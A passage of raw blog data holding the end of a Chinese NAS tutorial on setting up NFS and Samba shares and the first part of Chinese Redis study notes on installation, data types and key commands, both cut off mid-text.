class=\"code\"><pre><span class=\"line\">/directory/to/share client_IP(options)</span><br></pre></td></tr></table></figure>\n<p>例如，<code>~/shared_folder</code>目录以IP ‘192.168.1.100’共享并给它配置读写权限(Read-Write)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/home/username/shared_folder 192.168.1.100(rw,sync,no_root_squash,no_subtree_check)</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<span id=\"more\"></span>\n<ol>\n<li><p>导出NFS共享<br>执行如下代码导出NFS共享：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo exportfs -a</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重启NFS服务<br>Ubuntu/Debian:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl start nfs-kernel-server</span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> nfs-kernel-server</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>CentOS/RHEL/Fedora:<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl start nfs-server</span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> nfs-server</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li>调整防火墙规则</li>\n</ol>\n<p>如果防火墙开启了，需要允许NFS流量通过。Ubuntu/Debian下用<code>ufw</code>配置防火墙<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo ufw allow from 192.168.1.100 to any port nfs</span><br><span class=\"line\">sudo ufw reload</span><br></pre></td></tr></table></figure></p>\n<p>CentOS/RHEL/Fedora上使用<code>firewall-cmd</code>：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo firewall-cmd --permanent --add-service=nfs</span><br><span class=\"line\">sudo firewall-cmd --permanent --add-service=mountd</span><br><span class=\"line\">sudo firewall-cmd --permanent --add-service=rpc-bind</span><br><span class=\"line\">sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"挂载NFS卷\"><a href=\"#挂载NFS卷\" class=\"headerlink\" title=\"挂载NFS卷\"></a>挂载NFS卷</h3><p>由于NFS是跨Linux系统的文件共享协议，一般在Linux主机上使用<code>mount</code>命令将NFS共享作为网络卷挂载：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo mount -t nfs 192.168.1.100:/home/username/shared_folder /mnt/nfs </span><br></pre></td></tr></table></figure><br>挂载完成后可以使用<code>df - h</code>命令列出所有的挂载的卷（包含网络卷NFS）。如果想要在系统启动时自动挂载，可以将挂载信息写入<code>/etc/fstab</code>：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.1.100:/home/username/shared_folder /mnt/nfs nfs defaults 0 0</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"创建SMB服务\"><a href=\"#创建SMB服务\" class=\"headerlink\" title=\"创建SMB服务\"></a>创建SMB服务</h2><p>Linux上要创建SMB服务，需要使用<code>samba</code>包</p>\n<ol>\n<li><p>安装<code>samba</code><br>如果系统是<code>Debian</code>系（Ubuntu、Raspian）:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install samba</span><br></pre></td></tr></table></figure>\n<p>如果系统三<code>CentOS/RHEL/Fedora</code>之类使用<code>yum</code>作为包关系器:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo yum install samba</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置<code>samba</code></p>\n</li>\n</ol>\n<p>编译<code>/etc/samba/smb.conf</code>，添加一个配置块：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[MyShare]</span><br><span class=\"line\">    path = /home/thankod/smbshare</span><br><span class=\"line\">    browseable = yes</span><br><span class=\"line\">    read only = no</span><br><span class=\"line\">    guest ok = yes</span><br></pre></td></tr></table></figure><br>这部分配置用于创建一个名为<code>MyShare</code>的非只读共享，共享目录为<code>/home/thankod/smbshare</code>。需要保障共享目录存在且属主和属组和使用这个目录的用户一致。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir -p /home/thankod/smbshare</span><br><span class=\"line\">sudo chown -R thankod:thankod /home/thankod/smbshare</span><br></pre></td></tr></table></figure>\n<ol>\n<li>重启<code>samba</code>服务<br>配置完上述配置后，重启<code>samba</code>复苏：<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl restart samba</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"挂载SMB共享\"><a href=\"#挂载SMB共享\" class=\"headerlink\" title=\"挂载SMB共享\"></a>挂载SMB共享</h3>","tags":["NAS"]},{"title":"Redis学习笔记","url":"/2020/04/30/Redis%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<blockquote>\n<p>实验楼练习地址：<a href=\"https://www.shiyanlou.com/courses/106\">Redis基础教程</a>，本文拷贝自实验楼</p>\n</blockquote>\n<h1 id=\"Redis简介\"><a href=\"#Redis简介\" class=\"headerlink\" title=\"Redis简介\"></a>Redis简介</h1><h2 id=\"Redis-是什么\"><a href=\"#Redis-是什么\" class=\"headerlink\" title=\"Redis 是什么\"></a>Redis 是什么</h2><p>REmote DIctionary Server(Redis) 是一个由 Salvatore Sanfilippo 写的 key-value 存储系统。Redis 提供了一些丰富的数据结构，包括 lists、sets、ordered sets 以及 hashes ，当然还有和 Memcached 一样的 strings 结构。Redis 当然还包括了对这些数据结构的丰富操作。</p>\n<p>Redis 常被称作是一款数据结构服务器（data structure server）。Redis 的键值可以包括字符串（strings）类型，同时它还包括哈希（hashes）、列表（lists）、集合（sets）和 有序集合（sorted sets）等数据类型。</p>\n<p>对于这些数据类型，你可以执行原子操作。例如：对字符串进行附加操作（append）；递增哈希中的值；向列表中增加元素；计算集合的交集、并集与差集等。</p>\n<span id=\"more\"></span>\n<h2 id=\"Redis-的优点\"><a href=\"#Redis-的优点\" class=\"headerlink\" title=\"Redis 的优点\"></a>Redis 的优点</h2><p>性能极高：Redis 能支持超过 100K+ 每秒的读写频率。<br>丰富的数据类型：Redis 支持二进制案例的 Strings， Lists， Hashes， Sets 及 Ordered Sets 数据类型操作。<br>原子：Redis 的所有操作都是原子性的，同时 Redis 还支持对几个操作全并后的原子性执行。<br>丰富的特性：Redis 还支持 publish/subscribe， 通知， key 过期等等特性。</p>\n<h2 id=\"Redis的安装\"><a href=\"#Redis的安装\" class=\"headerlink\" title=\"Redis的安装\"></a>Redis的安装</h2><p>使用 Redis 只需要下载对应的软件包开箱即用，截止目前（2019.1）最新的版本有 5.* 可用，实验楼提供的是 2.8.4 稳定版，这也是目前市场的主流版本。</p>\n<h3 id=\"使用通用的源码包进行编译安装。\"><a href=\"#使用通用的源码包进行编译安装。\" class=\"headerlink\" title=\"使用通用的源码包进行编译安装。\"></a>使用通用的源码包进行编译安装。</h3><p>下载 Redis 的程序包：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget http://labfile.oss.aliyuncs.com/courses/106/redis-2.8.4.tar.gz</span><br><span class=\"line\">tar -xzvf redis-2.8.4.tar.gz</span><br><span class=\"line\">cd redis-2.8.4</span><br><span class=\"line\">make</span><br><span class=\"line\">make test</span><br></pre></td></tr></table></figure><br>服务端：<code>src/redis-server</code><br>客户端：<code>src/redis-cli</code><br>默认配置文件：<code>redis.conf</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp redis-server /usr/local/bin/</span><br><span class=\"line\">cp redis-cli /usr/local/bin/</span><br></pre></td></tr></table></figure><br>添加完成后在任何目录下输入 <code>redis-server</code> 可启动服务器，输入 <code>redis-cli</code> 可启动客户端。</p>\n<h3 id=\"Pacman\"><a href=\"#Pacman\" class=\"headerlink\" title=\"Pacman\"></a>Pacman</h3><p>在ArchLinux下用Pacman安装，版本号已经达到5.x，可一键安装服务器和客户端 <code>sudo pacman -S redis</code>，以守护进程启动 <code>sudo systemctl start redis</code>，启动客户端和上述方法一样。配置 <code>/etc/redis.conf</code></p>\n<h2 id=\"Redis启动\"><a href=\"#Redis启动\" class=\"headerlink\" title=\"Redis启动\"></a>Redis启动</h2><p>服务端通用的启动方法是 <code>redis-server</code>，默认占用6379端口，可以在启动时指定具体的配置文件，查看进程：<code>pe -ef|grep redis</code>。</p>\n<p>客户端启动方法为 <code>redis-cli</code>，在有的环境下，redis 交互环境可能出现中文乱码的情况，解决办法是用下列命令启动 redis 客户端 <code>redis-cli --raw</code></p>\n<h1 id=\"Redis数据类型\"><a href=\"#Redis数据类型\" class=\"headerlink\" title=\"Redis数据类型\"></a>Redis数据类型</h1><p>Redis 不仅仅是简单的 key-value 存储器，同时也是一种 data structures server。传统的 key-value 是指支持使用一个 key 字符串来索引 value 字符串的存储，而 Redis 中，value 不仅仅支持字符串，还支持更多的复杂结构，包括列表、集合、哈希表等。</p>\n<h2 id=\"Strings\"><a href=\"#Strings\" class=\"headerlink\" title=\"Strings\"></a>Strings</h2><p>字符串是一种最基本、最常用的 Redis 值类型。</p>\n<p>Redis 字符串是二进制安全的，这意味着一个 Redis 字符串能包含任意类型的数据，例如： 一张经过 base64 编码的图片或者一个序列化的 Ruby 对象。通过这样的方式，Redis 的字符串可以支持任意形式的数据，但是对于过大的文件不适合存入 redis，一方面系统内存有限，另外一方面字符串类型的值最多能存储 512M 字节的内容。</p>\n<p>可以使用 set 和 get 命令来创建和检索 strings。注意：<strong>set 命令将取代现有的任何已经存在的 key</strong>。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; set mykey myvalue</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; get mykey</span><br><span class=\"line\">&quot;myvalue&quot;</span><br></pre></td></tr></table></figure><br>set 命令还有一个提供附加参数的选项，我们能够让 set 命令只有在没有相同 key 的情况下成功，反之亦然，可以让 set 命令在有相同 key 值的情况下成功：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; set mykey newval nx</span><br><span class=\"line\">(nil)</span><br><span class=\"line\">127.0.0.1:6379&gt; set mykey newval xx</span><br><span class=\"line\">OK</span><br></pre></td></tr></table></figure></p>\n<p>对string类型数据的加法，自增：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; set counter 100 #初始化counter 100</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; incr counter #counter +1</span><br><span class=\"line\">(integer) 101</span><br><span class=\"line\">127.0.0.1:6379&gt; incrby counter 50 #counter +50</span><br><span class=\"line\">(integer) 151</span><br></pre></td></tr></table></figure><br>counter始终是字符串对象，但是字面量必须是<strong>整数</strong>才能适用加法自增。</p>\n<p>Redis 可以运用 mset 和 mget 命令一次性完成多个 key-value 的对应关系，使用 mget 命令，Redis 返回一个 value 数组：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; mset a 10 b 20 c 30</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; mget a b c</span><br><span class=\"line\">1) &quot;10&quot;</span><br><span class=\"line\">2) &quot;20&quot;</span><br><span class=\"line\">3) &quot;30&quot;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Lists\"><a href=\"#Lists\" class=\"headerlink\" title=\"Lists\"></a>Lists</h2><p>Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边），lpush 命令插入一个新的元素到头部，而 rpush 命令插入一个新元素到尾部。当这两个操作中的任一操作在一个空的 Key 上执行时就会创建一个新的列表。相似的，如果一个列表操作清空一个列表，那么对应的 key 将被从 key 空间删除。</p>\n<p>push 一类的命令的返回值为 list 的长度。这里有一些类表操作和结果的例子：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; rpush mylist A #如果mylist不存在，会自主创建初始化第一个元素为A</span><br><span class=\"line\">(integer) 1</span><br><span class=\"line\">127.0.0.1:6379&gt; rpush mylist B</span><br><span class=\"line\">(integer) 2</span><br><span class=\"line\">127.0.0.1:6379&gt; rpush mylist 0</span><br><span class=\"line\">(integer) 3</span><br><span class=\"line\">127.0.0.1:6379&gt; lrange mylist 0 -1 #0 -1表示按照序号从左到右，-1表示最后一个，用于展示全部</span><br><span class=\"line\">1) &quot;A&quot;</span><br><span class=\"line\">2) &quot;B&quot;</span><br><span class=\"line\">3) &quot;0&quot;</span><br></pre></td></tr></table></figure><br>这些命令都是可变的命令，也就是说你可以一次加入多个元素放入 list：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; rpush mylist 1 2 3 4 5 &quot;foo bar&quot;</span><br><span class=\"line\">(integer) 9</span><br><span class=\"line\">127.0.0.1:6379&gt; lrange mylist 0 -1</span><br><span class=\"line\">1) &quot;A&quot;</span><br><span class=\"line\">2) &quot;B&quot;</span><br><span class=\"line\">3) &quot;0&quot;</span><br><span class=\"line\">4) &quot;1&quot;</span><br><span class=\"line\">5) &quot;2&quot;</span><br><span class=\"line\">6) &quot;3&quot;</span><br><span class=\"line\">7) &quot;4&quot;</span><br><span class=\"line\">8) &quot;5&quot;</span><br><span class=\"line\">9) &quot;foo bar&quot;</span><br></pre></td></tr></table></figure></p>\n<p>在 Redis 的命令操作中，还有一类重要的操作：pop，它可以弹出一个元素，简单的理解就是获取并删除第一个元素，和 push 类似的是它也支持双边的操作，可以从右边弹出一个元素也可以从左边弹出一个元素，对应的指令为 rpop 和 lpop：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; del mylist #删除 初始化列表</span><br><span class=\"line\">(integer) 1</span><br><span class=\"line\">127.0.0.1:6379&gt;  rpush mylist a b c</span><br><span class=\"line\">(integer) 3</span><br><span class=\"line\">127.0.0.1:6379&gt; rpop mylist</span><br><span class=\"line\">&quot;c&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; lrange mylist 0 -1</span><br><span class=\"line\">1) &quot;a&quot;</span><br><span class=\"line\">2) &quot;b&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; lpop mylist</span><br><span class=\"line\">&quot;a&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; lrange mylist 0 -1</span><br><span class=\"line\">1) &quot;b&quot;</span><br></pre></td></tr></table></figure><br>一个列表最多可以包含 4294967295（2 的 32 次方减一） 个元素，这意味着它可以容纳海量的信息，最终瓶颈一般都取决于服务器内存大小。</p>\n<p>事实上，在高级的企业架构当中，会把缓存服务器分离开来，因为数据库服务器和缓存服务器的特点各异，比如对于数据库服务器应该用更快、更大的硬盘，而缓存专用服务器则偏向内存性能，一般都是 64GB 起步。</p>\n<h3 id=\"List-阻塞操作\"><a href=\"#List-阻塞操作\" class=\"headerlink\" title=\"List 阻塞操作\"></a>List 阻塞操作</h3><p>理解阻塞操作对一些请求操作有很大的帮助，关于阻塞操作的作用，这里举一个例子。</p>\n<p>假如你要去楼下买一个汉堡，一个汉堡需要花一定的时间才能做出来，非阻塞式的做法是去付完钱走人，过一段时间来看一下汉堡是否做好了，没好就先离开，过一会儿再来，而且要知道可能不止你一个人在买汉堡，在你离开的时候很可能别人会取走你的汉堡，这是很让人烦的事情。</p>\n<p>阻塞式就不一样了，付完钱一直在那儿等着，不拿到汉堡不走人，并且后面来的人统统排队。</p>\n<p>Redis 提供了阻塞式访问 brpop 和 blpop 命令。用户可以在获取数据不存在时阻塞请求队列，如果在时限内获得数据则立即返回，如果超时还没有数据则返回 null。</p>\n<h3 id=\"List-常见应用场景\"><a href=\"#List-常见应用场景\" class=\"headerlink\" title=\"List 常见应用场景\"></a>List 常见应用场景</h3><p>分析 List 应用场景需要结合它的特点，List 元素是线性有序的，很容易就可以联想到聊天记录，你一言我一语都有先后，因此 List 很适合用来存储聊天记录等顺序结构的数据。</p>\n<h2 id=\"Hashes\"><a href=\"#Hashes\" class=\"headerlink\" title=\"Hashes\"></a>Hashes</h2><p>Redis Hashes 是字符串字段和字符串值之间的映射，因此它们是展现对象的完美数据类型。例如一个有名、姓、年龄等等属性的用户：一个带有一些字段的 hash 仅仅需要一块很小的空间存储，因此你可以存储数以百万计的对象在一个小的 Redis 实例中。哈希主要用来表现对象，它们有能力存储很多对象，因此你可以将哈希用于许多其它的任务。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; hmset user:1000 username antirez birthyear 1977 verified 1</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; hget user:1000 username</span><br><span class=\"line\">&quot;antirez&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; hget user:1000 birthyear</span><br><span class=\"line\">&quot;1977&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; hgetall user:1000</span><br><span class=\"line\">1) &quot;username&quot;</span><br><span class=\"line\">2) &quot;antirez&quot;</span><br><span class=\"line\">3) &quot;birthyear&quot;</span><br><span class=\"line\">4) &quot;1977&quot;</span><br><span class=\"line\">5) &quot;verified&quot;</span><br><span class=\"line\">6) &quot;1&quot;</span><br></pre></td></tr></table></figure></p>\n<p>hmset 命令设置一个多域的 hash 表，hget 命令获取指定的单域，hgetall 命令获取指定 key 的所有信息。hmget 类似于 hget，只是返回一个 value 数组。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; hmget user:1000 username birthyear no-such-field</span><br><span class=\"line\">1) &quot;antirez&quot;</span><br><span class=\"line\">2) &quot;1977&quot;</span><br><span class=\"line\">3) (nil)</span><br></pre></td></tr></table></figure>\n<p>同样可以根据需要对 hash 表的表项进行单独的操作<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; hincrby user:1000 birthyear 10</span><br><span class=\"line\">(integer) 1987</span><br><span class=\"line\">127.0.0.1:6379&gt; hgetall user:1000</span><br><span class=\"line\">1) &quot;username&quot;</span><br><span class=\"line\">2) &quot;antirez&quot;</span><br><span class=\"line\">3) &quot;birthyear&quot;</span><br><span class=\"line\">4) &quot;1987&quot;</span><br><span class=\"line\">5) &quot;verified&quot;</span><br><span class=\"line\">6) &quot;1&quot;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Set\"><a href=\"#Set\" class=\"headerlink\" title=\"Set\"></a>Set</h2><p>Redis 集合（Set）是一个<strong>无序</strong>的字符串集合。你可以以 O(1) 的时间复杂度 (无论集合中有多少元素时间复杂度都是常量）完成添加、删除以及测试元素是否存在。</p>\n<p>Redis 集合拥有令人满意的不允许包含相同成员的属性，多次添加相同的元素，最终在集合里只会有一个元素，这意味着它可以非常方便地对数据进行去重操作，一个 Redis 集合的非常有趣的事情是它支持一些服务端的命令从现有的集合出发去进行集合运算，因此你可以在非常短的时间内进行合并（unions）， 求交集（intersections）， 找出不同的元素（differences of sets）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; sadd myset 1 2 3</span><br><span class=\"line\">(integer) 3</span><br><span class=\"line\">127.0.0.1:6379&gt; smembers myset</span><br><span class=\"line\">1) &quot;1&quot;</span><br><span class=\"line\">2) &quot;2&quot;</span><br><span class=\"line\">3) &quot;3&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; sismember myset 3</span><br><span class=\"line\">(integer) 1</span><br><span class=\"line\">127.0.0.1:6379&gt; sismember myset 30</span><br><span class=\"line\">(integer) 0</span><br><span class=\"line\">127.0.0.1:6379&gt; sismember mys 3</span><br><span class=\"line\">(integer) 0</span><br></pre></td></tr></table></figure>\n<p>sadd 命令产生一个无序集合，返回集合的元素个数。smembers 用于查看集。sismember 用于查看集合是否存在，匹配项包括集合名和元素个数。匹配成功返回 1，匹配失败返回 0。</p>\n<blockquote>\n<p>sismember myset 3<br>sismember myset 30<br>sismember mys 3<br>操作截图：</p>\n</blockquote>\n<h2 id=\"Sorted-Set\"><a href=\"#Sorted-Set\" class=\"headerlink\" title=\"Sorted Set\"></a>Sorted Set</h2><p>Redis 有序集合与普通集合非常相似，是一个没有重复元素的字符串集合。不同之处是有序集合的每一个成员都关联了一个权值，这个权值被用来按照从最低分到最高分的方式排序集合中的成员。集合的成员是唯一的，但是权值可以是重复的。</p>\n<p>使用有序集合你可以以非常快的速度（O(log(N))）添加、删除和更新元素。因为元素是有序的， 所以你也可以很快的根据权值（score）或者次序（position）来获取一个范围的元素。访问有序集合的中间元素也是非常快的，因此你能够使用有序集合作为一个没有重复成员的智能列表。在有序集合中，你可以很快捷的访问一切你需要的东西：有序的元素，快速的存在性测试，快速访问集合的中间元素！简而言之使用有序集合你可以完成许多对性能有极端要求的任务，而那些任务使用其它类型的数据库真的是很难完成的。</p>\n<p>zadd 与 sadd 类似，但是在元素之前多了一个参数，这个参数便是用于排序的。形成一个有序的集合。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">zadd hackers 1940 &quot;Alan Kay&quot;</span><br><span class=\"line\">zadd hackers 1957 &quot;Sophie Wilson&quot;</span><br><span class=\"line\">zadd hackers 1953 &quot;Richard Stallman&quot;</span><br><span class=\"line\">zadd hackers 1949 &quot;Anita Borg&quot;</span><br><span class=\"line\">zadd hackers 1965 &quot;Yukihiro Matsumoto&quot;</span><br><span class=\"line\">zadd hackers 1914 &quot;Hedy Lamarr&quot;</span><br><span class=\"line\">zadd hackers 1916 &quot;Claude Shannon&quot;</span><br><span class=\"line\">zadd hackers 1969 &quot;Linus Torvalds&quot;</span><br><span class=\"line\">zadd hackers 1912 &quot;Alan Turing&quot;</span><br></pre></td></tr></table></figure></p>\n<p>查看集合：zrange 是查看正序的集合，zrevrange 是查看反序的集合。0 表示集合第一个元素，-1 表示集合的倒数第一个元素。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; zrange hackers 0 -1</span><br><span class=\"line\">1) &quot;Alan Turing&quot;</span><br><span class=\"line\">2) &quot;Hedy Lamarr&quot;</span><br><span class=\"line\">3) &quot;Claude Shannon&quot;</span><br><span class=\"line\">4) &quot;Alan Kay&quot;</span><br><span class=\"line\">5) &quot;Anita Borg&quot;</span><br><span class=\"line\">6) &quot;Richard Stallman&quot;</span><br><span class=\"line\">7) &quot;Sophie Wilson&quot;</span><br><span class=\"line\">8) &quot;Yukihiro Matsumoto&quot;</span><br><span class=\"line\">9) &quot;Linus Torvalds&quot;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; zrevrange hackers 0 -1</span><br><span class=\"line\">1) &quot;Linus Torvalds&quot;</span><br><span class=\"line\">2) &quot;Yukihiro Matsumoto&quot;</span><br><span class=\"line\">3) &quot;Sophie Wilson&quot;</span><br><span class=\"line\">4) &quot;Richard Stallman&quot;</span><br><span class=\"line\">5) &quot;Anita Borg&quot;</span><br><span class=\"line\">6) &quot;Alan Kay&quot;</span><br><span class=\"line\">7) &quot;Claude Shannon&quot;</span><br><span class=\"line\">8) &quot;Hedy Lamarr&quot;</span><br><span class=\"line\">9) &quot;Alan Turing&quot;</span><br></pre></td></tr></table></figure>\n<p>使用 withscores 参数返回记录值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; zrange hackers 0 -1 withscores</span><br><span class=\"line\"> 1) &quot;Alan Turing&quot;</span><br><span class=\"line\"> 2) &quot;1912&quot;</span><br><span class=\"line\"> 3) &quot;Hedy Lamarr&quot;</span><br><span class=\"line\"> 4) &quot;1914&quot;</span><br><span class=\"line\"> 5) &quot;Claude Shannon&quot;</span><br><span class=\"line\"> 6) &quot;1916&quot;</span><br><span class=\"line\"> 7) &quot;Alan Kay&quot;</span><br><span class=\"line\"> 8) &quot;1940&quot;</span><br><span class=\"line\"> 9) &quot;Anita Borg&quot;</span><br><span class=\"line\">10) &quot;1949&quot;</span><br><span class=\"line\">11) &quot;Richard Stallman&quot;</span><br><span class=\"line\">12) &quot;1953&quot;</span><br><span class=\"line\">13) &quot;Sophie Wilson&quot;</span><br><span class=\"line\">14) &quot;1957&quot;</span><br><span class=\"line\">15) &quot;Yukihiro Matsumoto&quot;</span><br><span class=\"line\">16) &quot;1965&quot;</span><br><span class=\"line\">17) &quot;Linus Torvalds&quot;</span><br><span class=\"line\">18) &quot;1969&quot;</span><br></pre></td></tr></table></figure>\n<h1 id=\"Redis系统管理\"><a href=\"#Redis系统管理\" class=\"headerlink\" title=\"Redis系统管理\"></a>Redis系统管理</h1><h2 id=\"适合全体类型的常用命令\"><a href=\"#适合全体类型的常用命令\" class=\"headerlink\" title=\"适合全体类型的常用命令\"></a>适合全体类型的常用命令</h2><h3 id=\"EXISTS-and-DEL\"><a href=\"#EXISTS-and-DEL\" class=\"headerlink\" title=\"EXISTS and DEL\"></a>EXISTS and DEL</h3><p><code>exists key</code>：判断一个 key 是否存在，存在返回 1，否则返回 0。</p>\n<p><code>del key</code>：删除某个 key，或是一系列 key，比如：del key1 key2 key3 key4。成功返回 1，失败返回 0（key 值不存在）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; set mykey hello</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; exists mykey</span><br><span class=\"line\">(integer) 1</span><br><span class=\"line\">127.0.0.1:6379&gt; del mykey</span><br><span class=\"line\">(integer) 1</span><br><span class=\"line\">127.0.0.1:6379&gt; exists mykey</span><br><span class=\"line\">(integer) 0</span><br></pre></td></tr></table></figure>\n<h3 id=\"TYPE-and-KEYS\"><a href=\"#TYPE-and-KEYS\" class=\"headerlink\" title=\"TYPE and KEYS\"></a>TYPE and KEYS</h3><p><code>type key</code>：返回某个 key 元素的数据类型 (none:不存在，string:字符，list:列表，set:元组，zset:有序集合，hash:哈希)，key 不存在返回空。</p>\n<p><code>keys key—pattern</code>：返回匹配的 key 列表，比如：keys foo* 表示查找 foo 开头的 keys。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; set mykey x</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; type mykey</span><br><span class=\"line\">string</span><br><span class=\"line\">127.0.0.1:6379&gt; keys my*</span><br><span class=\"line\">1) &quot;mylist&quot;</span><br><span class=\"line\">2) &quot;mykey&quot;</span><br><span class=\"line\">3) &quot;myset&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; del mykey</span><br><span class=\"line\">(integer) 1</span><br><span class=\"line\">127.0.0.1:6379&gt; keys my*</span><br><span class=\"line\">1) &quot;mylist&quot;</span><br><span class=\"line\">2) &quot;myset&quot;</span><br><span class=\"line\">127.0.0.1:6379&gt; type mykey</span><br><span class=\"line\">none</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"RANDOMKEY-and-CLEAR\"><a href=\"#RANDOMKEY-and-CLEAR\" class=\"headerlink\" title=\"RANDOMKEY and CLEAR\"></a>RANDOMKEY and CLEAR</h3><p><code>randomkey</code>：随机获得一个已经存在的 key，如果当前数据库为空，则返回空字符串。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; randomkey</span><br><span class=\"line\">&quot;myset&quot;</span><br></pre></td></tr></table></figure><br><code>clear</code> 清屏</p>\n<h3 id=\"RENAME-and-RENAMENX\"><a href=\"#RENAME-and-RENAMENX\" class=\"headerlink\" title=\"RENAME and RENAMENX\"></a>RENAME and RENAMENX</h3><p><code>rename oldname newname</code>：更改 key 的名字，新键如果存在将被覆盖。</p>\n<p><code>renamenx oldname newname</code>：更改 key 的名字，新键如果存在则更新失败。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; rename mylist newlist</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; exists mylist</span><br><span class=\"line\">(integer) 0</span><br><span class=\"line\">127.0.0.1:6379&gt; exists newlist</span><br><span class=\"line\">(integer) 1</span><br></pre></td></tr></table></figure>\n<h3 id=\"DBSIZE\"><a href=\"#DBSIZE\" class=\"headerlink\" title=\"DBSIZE\"></a>DBSIZE</h3><p><code>dbsize</code> 返回当前数据库的 key 的总数。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; dbsize</span><br><span class=\"line\">(integer) 8</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Redis-时间相关命令\"><a href=\"#Redis-时间相关命令\" class=\"headerlink\" title=\"Redis 时间相关命令\"></a>Redis 时间相关命令</h2><h3 id=\"限定-key-生存时间\"><a href=\"#限定-key-生存时间\" class=\"headerlink\" title=\"限定 key 生存时间\"></a>限定 key 生存时间</h3><p>这同样是一个无视数据类型的命令，对于临时存储很有用处。避免进行大量的 DEL 操作。</p>\n<p><code>expire</code>：设置某个 key 的过期时间（<strong>秒</strong>)，比如：<code>expire bruce 1000</code> 表示设置 bruce 这个 key 1000 